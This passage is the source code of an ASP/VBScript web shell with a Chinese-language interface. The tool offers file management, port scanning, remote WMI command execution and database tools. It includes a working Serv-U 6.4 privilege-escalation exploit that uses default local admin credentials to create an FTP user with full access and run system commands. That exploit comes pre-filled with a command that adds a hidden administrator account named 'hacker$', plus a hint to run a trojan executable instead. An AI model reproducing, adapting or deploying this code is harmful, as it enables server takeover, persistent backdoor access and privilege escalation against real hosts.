fileName = Split(theUrl, "/")(UBound(Split(theUrl, "/")))
If fileName = "" Then
fileName = "index.htm.txt"
End If
thePath = thePath & "\" & fileName
.SaveToFile thePath, overWrite
jb"error,可能是因为文件已存在，或下载过程和地址中出 现错误 。 文件下载完 毕为空字节！！"
End If
.Close
End With
chkErr(Err)
Set Http = Nothing
Set Stream = Nothing
If isDebugMode = False Then
On Error Resume Next
End If
End Function
sEleCt cASe aCtiON
CasE "MainMenu":MAInMEnu()
CASE "GetTerminalInfo":GetTerminalInfo()
CAse "PageAddToMdb":paGEaddtoMdB()
cASE "ScanPort":SCAnPoRt()
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=M_Schumacher|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
"-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
"-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
"-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
"-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
"-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
"-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/M_Schumacher/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
jb"<form method='post' name='M_Schumacher'>"
jb"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
jb"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
jb"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
jb"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
jb"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
jb"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
jb"<script language='javascript'>"
jb"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
jb"setTimeout('document.all.M_Schumacher.submit();',4000);"
jb"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/M_Schumacher/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
jb"<form method='post' name='M_Schumacher'>"
jb"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
jb"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
jb"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
jb"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
jb"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
jb"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
jb"<script language='javascript'>"
jb"document.write('<center>正在提升权限,请等待...,<center>');"
jb"setTimeout(""document.all.M_Schumacher.submit();"",4000);"
jb"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
c.open "GET", "http://127.0.0.1:" & port & "/M_Schumacher/upadmin/s3", True, "", ""
c.send loginuser & loginpass & mt & deldomain & quit
set session("c")=c
jb"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
jb"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
jb"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
jb"<center><form method='post' name='M_Schumacher'>"
jb"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
jb"<tr align='center' valign='middle'>"
jb"<td colspan='2'>Serv-U 提升权限 6.4</td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td width='100'>用户名:</td>"
jb"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td>口 令：</td>"
jb"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td>端 口：</td>"
jb"<td><input name='port' type='text' id='port' value='43958'></td>"
jb"</tr>"
jb"<tr align='center' valign='middle'>"
jb"<td>系统路径：</td>"
jb"    <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
jb"  </tr>"
jb"  <tr align='center' valign='middle'>"
jb"    <td>命　令：</td>"
jb"    <td><input name='c' type='text' id='c' value='cmd /c net user hacker$ 123456 /add & net localgroup administrators hacker$ /add' size='50'></td>"
jb"  </tr>"
jb" <tr align='center' valign='middle'>"
jb"    <td colspan='2'><input type='submit' name='Submit' value='提交'> "
jb"<input type='reset' name='Submit2' value='重置'>"
jb"<input name='SUaction' type='hidden' id='action' value='1'></td>"
jb"  </tr>"
jb" <tr align='center' valign='middle'>"
jb"    <td>说　明：</td>"
jb"    <td><input name='ccc' type='text' id='ccc' value='可替换成:cmd /c D:\web\你的木马.exe 也可以是VBS' size='50'></td>"
jb"  </tr>"
jb"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject(oBt(0,0))
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case "Alexa"
dim AlexaUrl,Top
AlexaUrl=request("u")
Top=Alexa(AlexaUrl)
if AlexaUrl="" then AlexaUrl=""&sba&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='#'>服务器组件信息</td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>服务器名 </td><td bgcolor='#'> </td><td bgcolor='#'>"&WoriNima&"</td></tr><form method=post action='http://www.ip138.com/ips.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#'>服务器IP</td><td bgcolor='#'> </td><td bgcolor='#'><input type='text' name='ip' size='15' value='"&worininai&"'style='border:0px'><input type='submit' value='查询此服务器所在地'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><form method=post action='?Action=Alexa' name='form1'><tr align='center'><td height='20' width='200' bgcolor='#'>服务器Alexa排名</td><td bgcolor='#'> </td><td bgcolor='#'><input type='text' name='u' value='"&AlexaUrl&"' size=40 style='border:0px'>排名:<input type='text' value='"&Top&"' size=10><input type='submit'  value='查询'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#'>服务器时间</td><td bgcolor='#'> </td><td bgcolor='#'>"&now&" </td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>服务器CPU数量</td><td bgcolor='#'> </td><td bgcolor='#'>"&jbmc&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>服务器操作系统 </td><td bgcolor='#'> </td><td bgcolor='#'>"&jbmb&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#'>WEB服务器版本</td><td bgcolor='#'> </td><td bgcolor='#'>"&woriniba&"</td></tr>":For i=0 To 18:SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#'>"&ObT(i,0)&"</td><td bgcolor='#'>"&ObT(i,1)&"</td><td bgcolor='#' align=left>"&ObT(i,2)&"</td></tr>"
Next
echo SI
Err.Clear
function Alexa(AlexaURL)
on error resume next 
dim getsms,getstr,url
dim star,endd
url="http://data.alexa.com/data?cli=10&dat=snba&url="&AlexaURL
getsms=getHTTPPage(url)
if getsms<>"" then
star=instr(getsms,"<REACH RANK=""")+13
endd=instr(star,getsms,"</SD>")
getstr=mid(getsms,star,endd-star-4)
else
getstr="无排名"
end if
if IsNumeric(getstr)=false then getstr="无排名"
Alexa=getstr
end function

function getHTTPPage(url) 
on error resume next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then
getHTTPPage=""
exit function 
end if 
getHTTPPage=bytes2BSTR(Http.responseBody) 
set http=nothing
if err.number<>0 then err.Clear  
end function 
Function bytes2BSTR(vIn) 
dim strReturn 
dim i1,ThisCharCode,NextCharCode 
strReturn = "" 
For i1 = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i1,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i1+1,1)) 
strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i1 = i1 + 1 
End If 
Next 
bytes2BSTR = strReturn :Err.Clear:End Function:Case "WMI":if request("ok")<>"" then:set ww=server.createobject("wbemscripting.swbemlocator"):set cc=ww.connectserver(request("ok")):set ss=cc.get("Win32_ProcessStartup"):Set oC=ss.SpawnInstance_:oC.ShowWindow=12:Set pp=cc.get("Win32_Process"):pp.create "net user",null,oC,intProcessID:jb""<br>""&intProcessID:else:jb("<form method=""POST""> "):jb"远程执行命令":jb"<input name=""ok"" type=""text"" id=""ok"" value=""&quot;192.168.0.1&quot;,&quot;root/cimv2&quot;,&quot;administrator&quot;,&quot;hacker&quot;"" size=""70"">":jb"<input type=""submit"" name=""Submit"" value=""提交"">":jb"</form>":end if:function Unlin(bb):for i = 1 to len(bb):if mid(bb,i,1)<>"" then: tmp = Mid(bb, i, 1) + tmp:else:tmp=vbcrlf&tmp:end if:next:Unlin=tmp:end function:  Case "ReadREG":call ReadREG():Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing:Case "DownFile":DownFile FName:ShowErr():Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing:Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing:Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing:Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing:Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing:Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing:Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing:Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing:Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL:Case "UpFile":UpFile():Case "ScanDriveForm":ScanDriveForm:Case "ScanDrive":ScanDrive Request("Drive"):Case "ScFolder":ScFolder Request("Folder"):Case "Course":Course():Case "AdminUser":AdminUser():case "hiddenshell":hiddenshell():Case "chamacode":Case "Cmd1Shell":Cmd1Shell():Case "Upload":Upload():case "MMD":MMD():case "SetFileText":SetFileText():Case "radmin":radmin():Case "suftp":suftp():Case "goback":goback():Case "php":php():Case "apjdel":apjdel():Case "pcanywhere4":pcanywhere4():Case "CreateMdb":CreateMdb FName:Case "CompactMdb":CompactMdb FName:Case "DbManager":DbManager():Case Else MainForm():End Select
if Action<>"Servu" then ShowErr()
jb"</body></html>"  

 %>





